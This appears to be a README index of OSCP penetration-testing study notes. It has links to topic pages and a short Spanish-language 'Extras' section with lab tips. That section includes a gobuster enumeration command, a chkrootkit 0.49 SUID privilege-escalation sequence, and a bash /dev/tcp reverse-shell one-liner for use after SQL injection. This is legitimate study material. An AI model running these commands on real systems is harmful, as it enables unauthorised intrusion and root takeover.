# OSCP preparation

## List
- [**Windows Active Directory**](./winad.md)
- [**Shell Management**](./shellMGT.md)
- [**General enumeration**](./enum.md)
- [**Engagement Structure**](https://academy.hackthebox.com/module/39/section/384)
- [**File transfers**](./fileTransfer.md)
- [**Metasploit tricks**](./msf.md)
- [**Pivoting**](./pivoting.md)
- [**Cross-Site Scripting**](./xss.md)
- [**SQL Injection**](./sqli.md)
- [**Local File Inclusion & Path Traversal**](./LFI.md)
- [**Arbitrary File Upload**](./arbitraryFileUpload.md)
- [**Command Injection**](./commandInjection.md)
- [**Other web attacks**](./otherWebAttacks.md)
- [**Privilege Escalation**](./privEsc.md)
- [**Windows Privilege Escalation**](./winPrivEsc.md)
- [**Reporting**](./reporting.md)
- [**Documents, Office, LibreOffice, macros attacks**](./office.md)
- [**Cookie Extraction**](./cookieExtraction.md)
- [**Buffer Overflow**](./bufferOverflow.md)
- [**SMTP/POP/IMAP Mail Server Pentesting**](./smtp.md)

## Extras

### Maquina centOS una privesc rara
- https://seclists.org/fulldisclosure/2019/Apr/24


### En una maquina que pwnee que tenía la vuln shellshock, fue clave la enumeración para poder explotar la misma
```
❯ gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 400 -x cgi,php,sh --add-slash
```

#### el -x sh me dió la enumeración correcta

Sí encuentro el puerto 53 es conveniente seguir la siguiente guía de enumeración
https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns

### Vulnerabilidad en chkrootkit versión 0.49. Para evitar usar metasploit, sirve chequear:
[https://www.exploit-db.com/exploits/33899](https://www.exploit-db.com/exploits/33899)

```
cat /etc/cron.daily

/usr/bin/chkrootkit
ls -la /usr/bin/chkrootkit     // Do we have SUID?
chkrootkit -V
echo "#!/bin/bash" > /tmp/update
echo "chmod +s /bin/bash" >> /tmp/update
Wait a While ...
/bin/bash -p
whoami
```

### Problemas para reverse shell dentro de sqli

Hay veces que cuando puedo obtener RCE mediante una sqli porque tengo acceso de escritura con el user de la db que maneja la aplicación web no siempre me quiere ejecutar bien una revshell, pero con esto sí:

```
bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'
```

es el único que me vino funcionando en 2 maquinas de SQLI